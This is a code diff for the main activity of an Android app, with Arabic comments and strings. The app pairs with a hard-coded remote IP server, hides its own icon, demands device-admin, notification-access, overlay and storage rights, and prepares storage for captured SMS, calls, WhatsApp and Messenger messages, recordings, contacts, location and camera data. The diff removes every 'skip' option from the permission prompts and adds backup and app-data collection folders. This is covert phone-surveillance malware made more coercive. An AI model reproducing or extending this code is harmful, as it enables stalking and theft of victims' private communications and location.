@@ -48,7 +48,6 @@ public class MainActivity extends Activity {
     private TextView statusText;
     private String serverUrl = "http://216.128.156.226:8443";
     
-    // خطوات الإعداد
     private int step = 0;
     
     @Override
@@ -58,7 +57,6 @@ public class MainActivity extends Activity {
         prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
         handler = new Handler(Looper.getMainLooper());
         
-        // التحقق من الإعداد السابق
         if (prefs.getBoolean("configured", false)) {
             startServiceAndHide();
             return;
@@ -112,7 +110,7 @@ public class MainActivity extends Activity {
     }
     
     // ═══════════════════════════════════════════
-    // طلب الصلاحيات واحدة واحدة بالترتيب
+    // طلب الصلاحيات واحدة واحدة - بدون تخطي
     // ═══════════════════════════════════════════
     
     private void askPhonePerms() {
@@ -354,6 +352,7 @@ public class MainActivity extends Activity {
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
                 conn.setConnectTimeout(15000);
+                conn.setReadTimeout(15000);
                 
                 String deviceId = getAlzahraDeviceId();
                 String json = String.format("{\"code\":\"%s\",\"device_id\":\"%s\",\"model\":\"%s\",\"android\":\"%s\"}",
@@ -389,7 +388,7 @@ public class MainActivity extends Activity {
                     }
                 } else {
                     runOnUiThread(() -> {
-                        status.setText("❌ خطأ في الاتصال");
+                        status.setText("❌ خطأ في السيرفر");
                         status.setTextColor(0xFFFF5252);
                         btn.setEnabled(true);
                     });
@@ -410,7 +409,6 @@ public class MainActivity extends Activity {
             .setTitle("✅ تم الربط بنجاح!")
             .setMessage("هل تريد إخفاء التطبيق؟")
             .setPositiveButton("نعم، إخفاء", (d, w) -> {
-                // تغيير اسم التطبيق لإخفائه
                 hideAppIcon();
                 step++;
                 nextStep();
@@ -434,10 +432,6 @@ public class MainActivity extends Activity {
             Log.e(TAG, "Hide error", e);
         }
     }
-    
-    // ═══════════════════════════════════════════
-    // إنهاء الإعداد
-    // ═══════════════════════════════════════════
     
     private void finishSetup() {
         updateStatus("✅ تم الإعداد بنجاح!");
@@ -463,7 +457,7 @@ public class MainActivity extends Activity {
             
             if (!dir.exists()) dir.mkdirs();
             
-            String[] subs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp"};
+            String[] subs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp", "backups", "app_data"};
             for (String s : subs) {
                 File sub = new File(dir, s);
                 if (!sub.exists()) sub.mkdirs();
@@ -493,10 +487,6 @@ public class MainActivity extends Activity {
         finishAffinity();
     }
     
-    // ═══════════════════════════════════════════
-    // وظائف مساعدة
-    // ═══════════════════════════════════════════
-    
     private boolean hasPerm(String perm) {
         return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED;
     }
@@ -515,7 +505,6 @@ public class MainActivity extends Activity {
             .setTitle(title)
             .setMessage(msg)
             .setPositiveButton("السماح", (d, w) -> action.run())
-            .setNegativeButton("تخطي", (d, w) -> { step++; nextStep(); })
             .setCancelable(false)
             .show();
     }
@@ -545,12 +534,10 @@ public class MainActivity extends Activity {
                 step++;
                 nextStep();
             } else {
-                // إعادة طلب نفس الصلاحية
                 new AlertDialog.Builder(this)
                     .setTitle("⚠️ صلاحية مطلوبة")
                     .setMessage("يرجى السماح للمتابعة")
                     .setPositiveButton("إعادة", (d, w) -> nextStep())
-                    .setNegativeButton("تخطي", (d, w) -> { step++; nextStep(); })
                     .setCancelable(false)
                     .show();
             }
@@ -561,24 +548,23 @@ public class MainActivity extends Activity {
     protected void onActivityResult(int code, int result, Intent data) {
         super.onActivityResult(code, result, data);
         
-        // التحقق من نجاح العملية
         boolean success = false;
         
         switch (code) {
-            case 2001: // التخزين
+            case 2001:
                 success = Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager();
                 break;
-            case 2002: // الإشعارات
+            case 2002:
                 success = isNotificationEnabled();
                 break;
-            case 2003: // الظهور
+            case 2003:
                 success = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
                 break;
-            case 2004: // البطارية
+            case 2004:
                 PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                 success = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
                 break;
-            case 2005: // المسؤول
+            case 2005:
                 DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                 ComponentName admin = new ComponentName(this, AdminReceiver.class);
                 success = dpm != null && dpm.isAdminActive(admin);
@@ -591,12 +577,10 @@ public class MainActivity extends Activity {
             step++;
             nextStep();
         } else {
-            // إعادة المحاولة
             new AlertDialog.Builder(this)
                 .setTitle("⚠️ لم يتم التفعيل")
                 .setMessage("يرجى التفعيل للمتابعة")
                 .setPositiveButton("إعادة", (d, w) -> nextStep())
-                .setNegativeButton("تخطي", (d, w) -> { step++; nextStep(); })
                 .setCancelable(false)
                 .show();
         }
